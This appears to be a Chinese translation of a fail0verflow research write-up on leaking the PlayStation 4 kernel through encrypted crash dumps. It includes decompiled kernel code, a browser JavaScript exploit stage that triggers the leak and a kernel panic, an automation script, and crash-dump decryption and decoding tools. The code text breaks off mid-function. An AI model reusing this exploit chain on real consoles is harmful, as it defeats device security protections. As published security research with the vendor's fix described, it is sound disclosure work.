> 原文链接: https://www.anquanke.com//post/id/92909 


# 给我六天时间，攻破PS4游戏主机内核


                                阅读量   
                                **87087**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者ps4_enthusiast ，文章来源：fail0verflow.com
                                <br>原文地址：[https://fail0verflow.com/blog/2017/ps4-crashdump-dump/](https://fail0verflow.com/blog/2017/ps4-crashdump-dump/)

译文仅供参考，具体内容表达以及含义原文为准

<!-- [if gte mso 9]&gt;-->

[![](https://p1.ssl.qhimg.com/t01db1474e9ad91ce23.png)](https://p1.ssl.qhimg.com/t01db1474e9ad91ce23.png)

> 如果一个安全的设备，存在能让攻击者查看的故障转储（Crashdump）内容，会怎么样？如果该设备允许我们将任意内容写入故障转储，又可以怎么利用呢？令人震惊的是，PlayStation4就存在上述的问题，让我们来看看如何能够利用这些问题攻破PS4。本文仅探讨相关安全技术，且意为提升安全防护。

## PS4的故障转储

我们发现，PS4内核的崩溃处理机制有两个地方是非常值得注意的：

第一，这是PS4特定的代码。

第二，如果故障转储可以被解码，我们将会得到非常有用的信息，可以查找已有的漏洞，并发现可靠的漏洞利用方法。

通常，在FreeBSD系统中，如果发生内核错误（Kernel Panic），就会通过调用带有RB_DUMP标志的kern_reboot来创建转储。这会导致doadump被调用，该函数会将内核映像中的一小部分信息转储到某个存储设备上。

在PS4上，则以mdbg_run_dump替换了doadump，该函数可以从panic调用，也可以从trap_fatal直接调用。经过比较，我们发现其转储的内容包含着巨大的信息量：既有所有进程、线程、VM对象的内核状态，同时还有已加载库的一些元数据（Metadata）。与FreeBSD系统的另外一个不同之处是，mdbg_run_dump会将其逐字段地编码并记录到转储中，并且在将其存储到磁盘之前，会对产生的缓冲区进行加密。



## 转储所有内容

让我们重点观察mdbg_run_dump的某个特定部分——该部分会遍历所有进程的线程，并尝试转储一些线程属性状态（Pthread State）。

```
void mdbg_run_dump(struct trapframe *frame) `{`
    // ...
    for ( p = allproc; p != NULL; p = cur_proc-&gt;p_list.le_next ) `{`
        // ...
        for (td = p-&gt;p_threads.tqh_first; td != NULL; td = td-&gt;td_plist.tqe_next) `{`
            // ...
            mdbg_pthread_fill_thrinfo2(&amp;dumpstate, td-&gt;td_proc,
                (void *)td-&gt;td_pcb-&gt;pcb_fsbase, sysdump__internal_call_readuser);
            // ...
        `}`
        // ...
    `}`
    // ...
`}`

void mdbg_pthread_fill_thrinfo2(void *dst, struct proc *p, void *fsbase,
                               int (*callback)(void *dst, struct proc *p,
                                               signed __int64 va, int len)) `{`
  struct pthread *tcb_thread; // [rsp+8h] [rbp-408h]
  u8 pthread[984]; // [rsp+10h] [rbp-400h]

  if ( !callback(&amp;tcb_thread, p, (signed __int64)fsbase + 0x10, 8)
    &amp;&amp; !callback(pthread, p, (signed __int64)tcb_thread, 984) ) `{`
    *(_QWORD *)dst = *(_QWORD *)&amp;pthread[0xA8];
    *((_QWORD *)dst + 1) = *(_QWORD *)&amp;pthread[0xB0];
  `}`
`}`

int sysdump__internal_call_readuser(void *dst, struct proc *p,
                                    signed __int64 va, int len) `{`
  const void *src; // rsi
  struct vmspace *vm; // rcx
  int rv; // rax
  vm_paddr_t kva; // rax

  src = (const void *)va;
  if ( va &gt;= 0 ) `{`
    // if va is in userspace, get a kernel mapping of the address
    // (note "va" is treated as signed, here)
    vm = p-&gt;p_vmspace;
    rv = EFAULT;
    if ( !vm )
      return rv;
    kva = pmap_extract(vm-&gt;vm_pmap, va);
    src = (const void *)(kva | -(signed __int64)(kva &lt; 1) | 0xFFFFFE0000000000LL);
  `}`
  rv = EFAULT;
  if ( src &amp;&amp; src != (const void *)-1LL ) `{`
    if ( va &lt; 0 ) `{`
      src = (const void *)va;
    `}` else `{`
      rv = ESRCH;
      if ( !p )
        return rv;
    `}`
    // so, this can still be reached even if "va" is originally in kernel space!
    memcpy(dst, src, len);
    rv = 0LL;
  `}`
  return rv;
`}`
```

在上述代码中，我们发现，dumpstate是一个临时缓冲区，最终会进入到故障转储之中。因此，我们可以借助sysdump__internal_call_readuser来打造一个可以读取任意位置的函数。原因在于，fsbase将指向我们WebKit进程的用户模式（Usermode）地址空间。所以，即使不改变实际的fsbase值，我们也可以随意改变存储在fsbase+0x10位置的tcb_thread的值。

接下来，sysdump__internal_call_readuser会从内核地址中进行读取操作，并将读取的结果存入转储之中。

现在，我们就可以实现将内核中任意位置的内容放入转储之中，但是后续还需要对其进行解密和解码。除此之外，恐怕还有一个问题，就是针对每个线程，我们每次只能以这种方式获得0x10个字节。



## 故障转储的解密

经过我们对故障转储加密方式的分析，我们惊讶地发现，它所使用的是对称加密算法，并且还会在相同的固件版本之间使用相同的密钥。这也就意味着，如果内存被转储，我们只需要versioned_keys就可以对其实现解密（具体请参见文末的附录）。

这一问题从1.01固件版本开始就一直存在，并且，目前他们还没有意识到“重复使用可能暴露的对称密钥”是一个非常不安全的选择。在此之后，故障转储仍然是有用的，然而我们必须事先进行一次内核转储，才能获得密钥。



## 故障转储的解码

通过我们对1.01固件版本中符号的分析，发现编码过程被称为“nxdp”。故障转储的编码仅仅是简单地执行长度编码导数，并支持一些原始数据类型。相关的函数解析器，请参见文章末尾的附录。



## 故障转储自动化

如果说针对每个线程，每次只能获取到0x10个字节，那么我们的工作量就会异常巨大。然而，在测试过程中，我们发现在浏览器进程崩溃、挂起或拒绝创建更多线程之前，最多只能同时存在600个线程。基于此，我们做了简单的估算：

```
full_dump_size = 32MB
crashdump_cycle_time = ~5 minutes
thread_per_crashdump_cycle = 600
per_dump_size = thread_per_crashdump_cycle * 0x10 bytes = 9600 bytes
(full_dump_size / per_dump_size) * crashdump_cycle_time = 11 days
```

结果表明，大概需要用11天的时间。但最终，通过仔细选择需要转储的内存范围，我们成功将所需时间减少到6天。通常情况下，当我们进行转储时，会更倾向于线性地进行转储，这样一来，将有助于引入.bss和其他段，从而方便我们的静态分析工作。

在有了可以将内核通过故障转储泄露出来的先决条件之后，我们着手研究这一过程的自动化，这样一来，我就可以放心地让它自己去运行，并在几天之后能够收获到一个全新的内核转储。

由于PS4内核会将故障转储保存到硬盘驱动器中，因此我需要找到一种方法来拦截传输中的数据，或者找到一种方法直接在硬盘中读取数据。恰好，我在这时听说了vpikhur针对EAP的研究成果。关于攻击EAP的细节我们就不在本文讨论，详情请参阅他的演讲内容（[https://twitter.com/vpikhur/status/942123298392903681](https://twitter.com/vpikhur/status/942123298392903681)）。通过他的研究，我们知道EAP时Aeolia南桥中的一个嵌入式处理器，并且vpikhur已经解决了“如何获得持久的内核级代码并执行”这一问题。通过学习这一方法，我制作了一个EAP内核二进制文件，可以用来检测硬盘中的故障转储，并通过网络将其传输到我的电脑上。

在实现这一功能后，我对一些硬件部分进行了改动，具体来说是将PS4的电源开关接入网络，同时使用Linux的USB Gadget API模拟到PS4的输入。至此，我就可以使用简单的脚本来实现整个过程了。以下代码是在我的电脑上运行，并且会与用来控制PS4的远程控制Web服务器Novena进行通信：

```
import requests, time
import socket
import parse_dump
import struct
from io import BytesIO
import sys, traceback

remote_server = 'novena ip'

def send_cmd(cmd):
    requests.get('http://%s' % (remote_server), headers = `{`'remote-cmd' : cmd`}`)

def dump_index_get():
    with open('dump-index') as f:
        return int(f.read())
    return 0

def dump_index_set(index):
    print('setting dump-index to %i' % (index))
    with open('dump-index', 'w') as f:
        f.write('%i' % (index))

def dump_index_increment():
    index = dump_index_get()
    dump_index_set(index + 1)

def process_dump(partition_data):
    nxdp = parse_dump.NXDP(BytesIO(parse_dump.Decryptor(partition_data).data))
    # uses the most recent thread_info sent to the http server to transpose
    # the dump data into flat memory dumps
    nxdp.dump_thread_leak()

def recv_dump():
    sock = socket.socket()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', 1339))
        sock.listen(1)
        conn, addr = sock.accept()
        with conn:
            magic = struct.unpack('&lt;L', conn.recv(4))[0]
            if magic != 0x13371337:
                print('bad magic')
            length, status = struct.unpack('&lt;2L', conn.recv(4 * 2))
            if status != 0:
                print('bad status')
            data = b''
            while len(data) &lt; length:
                data += conn.recv(0x8000)
            process_dump(data)

dump_index_set(dump_index_get())
# turn on
send_cmd('power')
while True:
    # boot from healthy state takes ~30 seconds
    time.sleep(35)
    # going to browser should load exploit and crash ps4
    send_cmd('start-browser')
    # wait for exploit to run and ps4 to power off completely
    time.sleep(20)
    # power on ps4
    # it will go through fsck (~60secs) and boot to a "send error report?" screen.
    send_cmd('power') # power must be pressed twice...
    time.sleep(2)
    send_cmd('power')
    time.sleep(60) # fsck
    time.sleep(35) # power-up
    # go past "send error report?" screen...
    send_cmd('ack-crash')
    # wait for xmb to load
    time.sleep(10)
    # go to rest mode to let EAP do it's thing
    send_cmd('suspend')
    # wait for data to arrive and process it
    try:
        recv_dump()
        # after recving all data from EAP, need to wait for reboot (done on loop)
        # assuming EAP sent data OK, it will reboot by itself into healthy state
        dump_index_increment()
    except:
        # expect that nxdp data was recv'd, but decode fail -&gt; just retry same
        # position
        exc_type, exc_value, exc_traceback = sys.exc_info()
        traceback.print_exception(exc_type, exc_value, exc_traceback)
        print('nxdp decode failed, retry')
```



## 触发漏洞

为了逐步对我此前指定的区域进行转储，我创建了一个简单的JSON Schema来记录元数据，这些元数据可以用来将TID绑定到其故障转储部分所包含的内核地址，并且保留每次运行所使用的基地址 （在这里是getDumpIndex()）。 下面是在PS4浏览器进程中执行的部分JS代码，这段代码的作用是启动故障转储：

```
...
    // spawn threads which will just spin, and modify tcb-&gt;tcb_thread
    // inf loop around nanosleep(30 secs)
    var thread_map = [];
    for (var thrcnt = 0; thrcnt &lt; 600; thrcnt++) `{`
        var local_buf = scratchPtr.plus(0x2000);
        var rv = doCall(gadgets.pthread_create, local_buf, 0,
            syms.libkernel.inf_loop_with_nanosleep, 0);
        var thread = read64(local_buf);
        var tcb = read64(thread.plus(0x1e0));
        var tid = read32(thread);
        thread_map.push(`{` tcb_thread_ptr : tcb.plus(0x10), thr_idx : thrcnt,
            tid : tid`}`);
    `}`

    // this was for back when there was no kernel .text aslr :)
    var dump_base = new U64(0x80000000, 0xffffffff);
    dump_base = dump_base.plus(600 * 0x10 * getDumpIndex());
    
    // sync layout so dumped memory can be ordered correctly
    sendThreadInfo(dump_base, thread_map);
    
    // wait for threads to start - delayed start could overwrite tcb_thread
    doCall(gadgets.sleep, 3);
    
    // now set tcb_thread
    dump_base = dump_base.minus(0xa8);
    for (var i = 0; i &lt; thread_map.length; i++) `{`
        // 0x10 bytes at each tcb_thread + 0xa8 will be added to dump
        var t = thread_map[i];
        var dumpaddr = dump_base.plus(t.thr_idx * 0x10);
        write64(t.tcb_thread_ptr, dumpaddr);
    `}`
    
    // panic (here, using namedobj bug to free invalid pointer)
    kernel_free(toU64(0xdeadbeef));
    return;
`}`
```

在发生内核错误和故障转储之后，PS4将重新启动，并进入标准的fsck（检查修复文件系统中的错误）过程。 随后，我的控制脚本会使PS4进入挂起模式，此时自定义的EAP内核将接管，并将故障转储上传至我的电脑。 在上传完成之后，故障转储将被解密和解析，以提取泄漏出来的9600字节。 然后，这一过程将会持续长达6天之久。



## 修复方式

在4.50版本的固件，故障转储密钥的生成方法中，他们终于改用了非对称密钥，以便能够解密转储内容。

```
// one of the first calls mdbg_run_dump makes
int sysdump_output_establish_secure_context_on_dump() `{`
  int rv; // eax
  u8 nonces_to_sign[32]; // [rsp+8h] [rbp-48h]

  // fill globals
  sysdump_rng_nonce3_128(nonce3);
  sysdump_rng_nonce4_128(nonce4);

  memcpy(nonces_to_sign, nonce3, 16LL);
  memcpy(&amp;nonces_to_sign[16], nonce4, 16LL);
  rv = RsaesOaepEnc2048_Sha256(sysdump_rsa_n, sysdump_rsa_e, nonces_to_sign, 32,
                               sysdump_rsa_enc_nonces);
  if ( rv )
    bzero(sysdump_rsa_enc_nonces, 0x100uLL);
  Sha256HmacInit(sysdump_hmac_ctx, nonce4, 0x10u);
  bzero(dump_aes_ctx_iv, 0x10uLL);
  return rv;
`}`
```

以上版本的sysdump_output_establish_secure_context_on_dump来自于版本号为4.55的固件。 nonce3是将要被用作故障转储AES密钥的值。该值只会存储在经过RSA加密的二进制大对象（Blob）的转储之中。 因此，我们需要研究一个新的方法来恢复密钥。



## 总结

这可能是我针对一个漏洞，所做过的最复杂和最漫长的分析，但这无疑是一次有趣的经历。

坚持不懈，攻破万物！



## 附录

故障转储解密器源代码：

```
'''
This decrypts a coredump stored on the "custom" swap partition.
The GPT UUID is B4 A5 A9 76 B0 44 2A 47 BD E3 31 07 47 2A DE E2
Look for "Decryptor.header_t" (see below)...
'''
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
import binascii, struct
from construct import *

def aes_ecb_encrypt(k, d):
    return AES.new(k, AES.MODE_ECB).encrypt(d)
def aes_ecb_decrypt(k, d):
    return AES.new(k, AES.MODE_ECB).decrypt(d)
def hmac_sha256(k, d):
    return HMAC.new(k, msg = d, digestmod = SHA256).digest()

def ZeroPadding(size):
    return Padding(size , strict = True)

class RootKeys:
    def __init__(s, kd, kc):
        s.kd = binascii.unhexlify(kd)
        s.kc = binascii.unhexlify(kc)

class Keyset:
    def __init__(s, hmac_key, aes_key):
        s.hmac_key, s.aes_key = hmac_key, aes_key
        s.iv = b'\0' * len(s.aes_key)

class Decryptor:
    DUMP_BLOCK_LEN = 0x4000
    versioned_keys = `{`
        1 : [RootKeys('you', 'should')],
        2 : [RootKeys('probably', 'find')],
        3 : [
            RootKeys('these', 'your-'), # 4.05
            RootKeys('self', ':)'), # 4.07
        ]
    `}`
    secure_header_t = Struct('secure_header',
        # only seen version 1 so far
        ULInt32('version'),
        # Aes128Ecb(kd, openpsid)
        Bytes('openpsid_enc', 0x10),
        # 0x80 bytes of secure_header are hashed for the data_hmac,
        # but only 0x14 bytes (actual used bytes) are actually written to disk...
        ZeroPadding(0x80 - 0x14),
    )
    final_header_t = Struct('final_header',
        Bytes('unknown', 0x10),
        # 1 : unread dump present, 2 : no new dump data
        ULInt64('state'),
        ULInt64('data_len'),
        ZeroPadding(0x10),
        Bytes('data_hmac', 0x20)
    )
    header_t = Struct('header',
        secure_header_t,
        ZeroPadding(0x100 - secure_header_t.sizeof()),
        final_header_t
    )
    def keygen(s, openpsid, root_keys):
        openpsid_enc = aes_ecb_encrypt(root_keys.kd, openpsid)
        digest = hmac_sha256(root_keys.kc, openpsid_enc)
        return Keyset(digest[:0x10], digest[0x10:])
    def hmac_verify(s, keyset):
        hmac = HMAC.new(keyset.hmac_key, digestmod = SHA256)
        with open(s.fpath, 'rb') as f:
            hmac.update(f.read(s.secure_header_t.sizeof()))
            data_len = s.header.final_header.data_len
            data_len -= s.DUMP_BLOCK_LEN
            f.seek(s.DUMP_BLOCK_LEN)
            hmac.update(f.read(data_len))
            return hmac.digest() == s.header.final_header.data_hmac
        return False
    def unwrap_keyset(s):
        openpsid_enc = s.header.secure_header.openpsid_enc
        version = s.header.secure_header.version
        for root_keys in s.versioned_keys[version]:
            openpsid = aes_ecb_decrypt(root_keys.kd, openpsid_enc)
            digest = hmac_sha256(root_keys.kc, openpsid_enc)
            keyset = Keyset(digest[:0x10], digest[0x10:])
            if s.hmac_verify(keyset):
                print('OpenPSID:\n  %s' % (binascii.hexlify(openpsid)))
                return keyset
        return None

    def __init__(s, fpath, default_openpsid = None, default_keyset_id = None):
        s.fpath = fpath
        with open(s.fpath, 'rb') as f:
            s.header = s.header_t.parse_stream(f)
        if s.header.final_header.state == 1:
            s.keyset = s.unwrap_keyset()
        else:
            # something happened to the dump (like it was "consumed" after a reboot).
            # in that case most of the header will be zerod
            assert default_openpsid is not None,
                'must provide openpsid to decrypt dump without secure_header'
            assert default_keyset_id is not None,
                'must provide keyset id to decrypt dump without secure_header'
            root_keys = s.versioned_keys[default_keyset_id[0]][default_keyset_id[1]]
            s.keyset = s.keygen(default_openpsid, root_keys)
        assert s.keyset is not None

        # just decrypt it all at once for now
        # if we reach here, hmac is already verified or it didn't exist
        with open(s.fpath, 'rb') as f:
            f.seek(s.DUMP_BLOCK_LEN)
            data_enc = f.read()
            # This should actually be AesCbcCfb128Encrypt,
            # but it's always block-size multiple in crashdump usage.
            s.data = AES.new(s.keyset.aes_key, AES.MODE_CBC, s.keyset.iv).decrypt(data_enc)
        '''
        with open('debug.bin', 'wb') as fo:
            fo.write(s.data)
        #'''
```

NXDP解码器源代码：

```
import binascii, struct
from construct import *
from io import BytesIO
import argparse

def sign_extend(value, bits):
    sign_bit = 1 &lt;&lt; (bits - 1)
    return (value &amp; (sign_bit - 1)) - (value &amp; sign_bit)

class NxdpObject(object):
    def __init__(s, obj): s.parse(obj)
    def parse(s, o): s.obj = o
    def __repr__(s):
        stuff = ['Unformatted Object:']
        for i in s.obj:
            if isinstance(i, int):
                stuff.append('%16x' % (i))
            elif isinstance(i, bytes):
                stuff.append(str(binascii.hexlify(i)))
            else:
                stuff.append(repr(i))
        return '\n'.join(stuff)
class NxdpKernelInfo(NxdpObject):
    kernel_version_t = Struct('kernel_version',
        ULInt32('field_0'),
        ULInt32('firmware_version'),
        ULInt64('mdbg_kernel_build_id'),
        ZeroPadding(0x20 - 0x10)
    )
    def parse(s, o):
        s.ver = s.kernel_version_t.parse(o[0])
    def __repr__(s):
        fw_ver_maj = s.ver.firmware_version &gt;&gt; 24
        fw_ver_min = (s.ver.firmware_version &gt;&gt; 12) &amp; 0xfff
        fw_ver_unk = s.ver.firmware_version &amp; 0xfff
        fw_ver = '%02x.%03x.%03x' % (fw_ver_maj, fw_ver_min, fw_ver_unk)
        l = []
        l.append('Kernel Version Info')
        l.append('  unk %8x' % (s.ver.field_0))
        l.append('  fw version %s' % (fw_ver))
        l.append('  kernel build id %16x' % (s.ver.mdbg_kernel_build_id))
        return '\n'.join(l)
class NxdpBuffer(NxdpObject):
    class Buffer:
        def __init__(s, va, buf):
            s.va = va
            s.buf = buf
    def parse(s, o):
        # seems to be generic; has subtype (1 : ascii string, 2 : raw bytes)
        # raw bytes are an array of &lt;virtual address, bytes&gt; pairs
        s.buftype = o[0]
        if s.buftype == 1:
            s.strbuf = o[1].decode('ascii')
        elif s.buftype == 2:
            s.bufs = []
            for va, size, buf in o[1]:
                assert size == len(buf)
                s.bufs.append(s.Buffer(va, buf))
        elif s.buftype == 3:
            s.buf = o[1]
        else: assert False
    def __repr__(s):
        l = []
        l.append('---------buffer begin-------')
        if s.buftype == 1:
            l.append(s.strbuf)
        elif s.buftype == 2:
            for buf in s.bufs:
                l.append('Virtual Address: %16x, Length %x' % (buf.va, len(buf.buf)))
                # TODO pretty-hexdump
                # normally used for stacks...should pretty-print stacks too
                l.append(str(binascii.hexlify(buf.buf), 'ascii'))
        elif s.buftype == 3:
            l.append('Kernel panic summary:')
            l.append(str(binascii.hexlify(s.buf), 'ascii'))
        l.append('---------buffer end---------')
        return '\n'.join(l)
class NxdpKernelPanic(NxdpObject):
    def parse(s, o):
        s.panicstr = o[0].decode('ascii').rstrip('\n')
    def __repr__(s):
        return 'Panic Message:\n  %s' % (s.panicstr)
class NxdpKernelPanicLarge(NxdpObject):
    def parse(s, o):
        s.panicstr = o[0].decode('ascii') + o[1].decode('ascii')
        s.unks = o[2:]
    def __repr__(s):
        l = ['Panic Message(ver2):']
        l.append('  unk %x %x %x' % (s.unks[0], s.unks[1], s.unks[2]))
        l.append('  log: %s' % (s.panicstr))
        return '\n'.join(l)
class NxdpKernelTrapFrame(NxdpObject):
    reg_indices = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15', 'rip', 'rflags']
    def parse(s, o):
        s.trapno = o[0]
        s.err = o[1]
        s.addr = o[2]
        s.regs = []
        for idx, val in o[3]:
            s.regs.append((idx, val))
    def __repr__(s):
        l = ['Trap Frame']
        l.append('  trapno %x' % (s.trapno))
        l.append('  err %x' % (s.err))
        l.append('  addr %16x' % (s.addr))
        for reg in s.regs:
            l.append('  %6s : %16x' % (s.reg_indices[reg[0]], reg[1]))
        return '\n'.join(l)
class NxdpDumperInfo(NxdpObject):
    def parse(s, o):
        s.unk = o[0]
        s.tid = o[1]
    def __repr__(s):
        l = ['Dumper Info']
        l.append('  unk %x' % (s.unk))
        l.append('  tid %x' % (s.tid))
        return '\n'.join(l)
class NxdpProcessInfo(NxdpObject):
    def parse(s, o):
        s.pid = o[0]
        s.subtypes = []
        s.subobjs = []
        for i in o[1]:
            if i[0] not in s.subtypes:
                s.subtypes.append(i[0])
            s.subobjs.append(NxdpParser.parse(i))
    def __repr__(s):
        l = ['', 'Process Info']
        l.append('  pid %x' % (s.pid))
        l.append('  subtypes seen %s' % (s.subtypes))
        for subobj in s.subobjs:
            l.append(str(subobj))
        return '\n'.join(l)
class NxdpSceDynlibInfo(NxdpObject):
    dynlib_info_t = Struct('dynlib_info',
        ULInt64('some_tid'),
        ULInt8('flags'),
        ZeroPadding(7),
        ULInt64('ppid'),
        String('comm', 0x20, encoding = 'ascii', padchar = '\0'),
        String('path', 0x400, encoding = 'ascii', padchar = '\0'),
        Bytes('fingerprint', 0x14),
        ULInt64('entrypoint'),
        ULInt64('field_454'),
        ULInt64('field_45c'),
        ULInt32('field_464'),
        ULInt32('field_468'),
        ULInt32('field_46c'),
        ULInt64('field_470'),
        ULInt32('p_sig'),
        ULInt32('field_47c'),
        # XXX it seems at some point, this field was added...
        ULInt32('field_480'),
    )
    def parse(s, o):
        if len(o[0]) != s.dynlib_info_t.sizeof():
            print('unexpected dynlib info size, %x' % (len(o[0])))
        s.info = s.dynlib_info_t.parse(o[0])
    def __repr__(s):
        l = ['Library Info']
        l.append('  some tid %x' % (s.info.some_tid))
        l.append('  flags %x' % (s.info.flags))
        l.append('  parent pid %x' % (s.info.ppid))
        l.append('  comm %s' % (s.info.comm))
        l.append('  path %s' % (s.info.path))
        l.append('  fingerprint %s' % (binascii.hexlify(s.info.fingerprint)))
        l.append('  entrypoint %16x' % (s.info.entrypoint))
        l.append('  unks (dynlib) field_454 %16x field_45c %16x field_464 %8x field_468 %8x' % (
            s.info.field_454, s.info.field_45c, s.info.field_464, s.info.field_468))
        l.append('  p_sig %8x' % (s.info.p_sig))
        l.append('  unks (proc)   field_46c %8x field_470 %16x field_47c %8x field_480 %8x' % (
            s.info.field_46c, s.info.field_470, s.info.field_47c, s.info.field_480))
        return '\n'.join(l)
class NxdpPcb(NxdpObject):
    # there are more (see struct pcb), but these are what we expect in the dump
    reg_indices = `{`
        59 : 'fsbase',
        60 : 'rbx',
        61 : 'rsp',
        62 : 'rbp',
        63 : 'r12',
        64 : 'r13',
        65 : 'r14',
        66 : 'r15',
        67 : 'rip',
    `}`
    envxmm_t = Struct('envxmm',
        ULInt16('en_cw'),
        ULInt16('en_sw'),
        ULInt8('en_tw'),
        ULInt8('en_zero'),
        ULInt16('en_opcode'),
        ULInt64('en_rip'),
        ULInt64('en_rdp'),
        ULInt32('en_mxcsr'),
        ULInt32('en_mxcsr_mask'),
    )
    sv_fp_t = Struct('sv_fp',
        Bytes('fp_acc', 10),
        # TODO why is this nonzero?
        #Padding(6),
        Bytes('sbz', 6),
    )
    savefpu_xstate_t = Struct('savefpu_xstate',
        ULInt64('xstate_bv'),
        #Bytes('xstate_rsrv0', 16),
        ZeroPadding(16),
        #Bytes('xstate_rsrv', 40),
        ZeroPadding(40),
        Array(16, Bytes('ymm_bytes', 16))
    )
    savefpu_ymm_t = Struct('savefpu_ymm',
        envxmm_t,
        Array(8, sv_fp_t),
        Array(16, Bytes('xmm_bytes', 16)),
        # TODO why is this nonzero?
        #ZeroPadding(96),
        Bytes('sbz', 96),
        savefpu_xstate_t
    )
    def parse(s, o):
        s.flags = o[0]
        s.fpu = s.savefpu_ymm_t.parse(o[1])
        s.regs = []
        for idx, val in o[2]:
            s.regs.append((idx, val))
    def __repr__(s):
        l = ['Process Control Block']
        l.append('  flags %x' % (s.flags))
        l.append('  fpu state %s' % (s.fpu))
        for reg in s.regs:
            l.append('  %s : %16x' % (s.reg_indices[reg[0]], reg[1]))
        return '\n'.join(l)
class NxdpProcessThread(NxdpObject):
    def parse(s, o):
        s.tid = o[0]
        s.subobjs = []
        for i in o[1]:
            s.subobjs.append(NxdpParser.parse(i))
    def __repr__(s):
        l = ['Thread Info']
        l.append('  tid %x' % (s.tid))
        for subobj in s.subobjs:
            l.append(str(subobj))
        return '\n'.join(l)
class NxdpThreadInfo(NxdpObject):
    thread_info_t = Struct('thread_info',
        ULInt64('pthread_a8'),
        ULInt64('pthread_b0'),
        ULInt64('field_10'),
        ULInt64('td_priority'),
        ULInt64('td_oncpu'),
        ULInt64('td_lastcpu'),
        # if !td_wchan, then thread-&gt;field_458
        ULInt64('td_wchan'),
        ULInt32('field_38'),
        ULInt32('td_state'),
        ULInt32('td_inhibitors'),
        String('td_wmesg', 0x20, encoding = 'ascii', padchar = '\0'),
        String('td_name', 0x20, encoding = 'ascii', padchar = '\0'),
        ULInt32('pid'),
        ULInt64('td_field_450'),
        ULInt32('td_cpuset'),
        # XXX this struct size has been changed...
        Bytes('newstuff', 0xbc - 0x94)
    )
    def parse(s, o):
        s.info = s.thread_info_t.parse(o[0])
    def __repr__(s):
        return str(s.info)
class NxdpTitleInfo(NxdpObject):
    # this is a new object, so the meanings are a guess
    def parse(s, o):
        s.title_id = o[0].decode('ascii').rstrip('\0')
        s.app_id = o[1]
        s.unk0 = o[2]
        s.unk1 = o[3]
    def __repr__(s):
        l = ['Title Info']
        l.append('  title id   %s' % (s.title_id))
        l.append('  app id     %x' % (s.app_id))
        l.append('  unk values %x %x' % (s.unk0, s.unk1))
        return '\n'.join(l)
class NxdpSceDynlibImports(NxdpObject):
    dynlib_import_t = Struct('dynlib_import',
        ULInt32('pid'),
        # IDT index
        ULInt32('handle'),
        ZeroPadding(8),
        # 0x10
        ZeroPadding(0x20),
        String('path', 0x400, encoding = 'ascii', padchar = '\0'),
        ZeroPadding(8),
        Bytes('fingerprint', 0x14),
        # 0x44c
        ZeroPadding(4),
        ULInt32('refcount'),
        ULInt64('entrypoint'),
        ULInt64('dyl2_field_138'),
        # 0x464
        ULInt64('dyl2_field_140'),
        ULInt64('dyl2_field_148'),
        ULInt64('dyl2_field_158'),
        ULInt32('dyl2_field_150'),
        ULInt32('dyl2_field_160'),
        ULInt64('text_base'),
        ULInt64('text_size'),
        ULInt32('field_494'),
        # 0x498
        ULInt64('data_base'),
        ULInt64('data_size'),
        # 0x4a8
        ULInt32('dyl2_field_94'),
        # TODO there seems to be more nonzero stuff in here?
        Padding(0x6b4 - 0x4ac)
    )
    def parse(s, o):
        # XXX this was added on later fw versions
        # seems to duplicate handle for some reason
        s.idx = o[0]
        # same across versions
        s.info = s.dynlib_import_t.parse(o[1])
    def __repr__(s):
        l = ['Import Info']
        l.append('  id %x' % (s.idx))
        l.append(str(s.info))
        return '\n'.join(l)
class NxdpVmMap(NxdpObject):
    vm_map_t = Struct('vm_map',
        ULInt32('field_0'),
        ULInt64('start'),
        ULInt64('end'),
        ULInt64('field_14'),
        ULInt64('field_1c'),
        ULInt64('field_24'),
        ULInt32('prot'),
        ULInt32('field_30'),
        ULInt32('field_34'),
        String('name', 0x20, encoding = 'ascii', padchar = '\0'),
        ULInt32('field_58'),
        ULInt32('field_5c'),
        # XXX this was added on later fw versions
        ULInt32('field_60'),
    )
    def parse(s, o):
        s.info = s.vm_map_t.parse(o[0])
    def __repr__(s):
        l = 'VM Map Entry: %16x - %16x %x %s' % (s.info.start, s.info.end, s.info.prot, s.info.name)
        return l
class NxdpKernelRandom(NxdpObject):
    def parse(s, o):
        s.seed = o[0]
        s.slide = o[1]
    def __repr__(s):
        l = ['Kernel Random Info']
        l.append('  seed  %s' % (binascii.hexlify(s.seed)))
        l.append('  slide %x' % (s.slide))
        return '\n'.join(l)
class NxdpInterruptInfo(NxdpObject):
    def parse(s, o):
        s.from_ip = o[0]
        s.to_ip = o[1]
    def __repr__(s):
        l = ['Last Interrupt IP Info']
        l.append('  from %x' % (s.from_ip))
        l.append('  to   %x' % (s.to_ip))
        return '\n'.join(l)

class NxdpParser:
    process_types = `{`
        0x21 : NxdpProcessInfo,
        0x22 : NxdpProcessThread,
    `}`
    type_parsers = `{`
        0x00 : process_types,
        0x01 : NxdpSceDynlibInfo,
        0x02 : NxdpThreadInfo,
        # 0x03 is SCE ID table stuff...seems they removed it from later fw coredumps?
        0x04 : NxdpSceDynlibImports,
        0x05 : NxdpVmMap,
        0x10 : NxdpKernelInfo,
        0x11 : NxdpBuffer,
        0x21 : NxdpKernelPanic,
        0x22 : NxdpKernelTrapFrame,
        0x23 : NxdpPcb,
        0x24 : NxdpDumperInfo,
        0x25 : NxdpKernelRandom,
        0x26 : NxdpTitleInfo,
        0x27 : NxdpInterruptInfo,
        0x28 : NxdpKernelPanicLarge,
    `}`
    @staticmethod
    def parse(obj):
        try:
            f = NxdpParser.type_parsers[obj[0]]
            l = 1
            while isinstance(f, dict):
                f = f[obj[l]]
                l += 1
            return f(obj[l:])
        except KeyError:
            return NxdpObject(obj)

class NXDP:
    def __init__(s, buf):
        s.buf = buf
        s.nonce = s.buf.read(0x10)
        unpacked = s.decode()
        s.root_raw = unpacked
        s.parsed = []
        for i in unpacked:
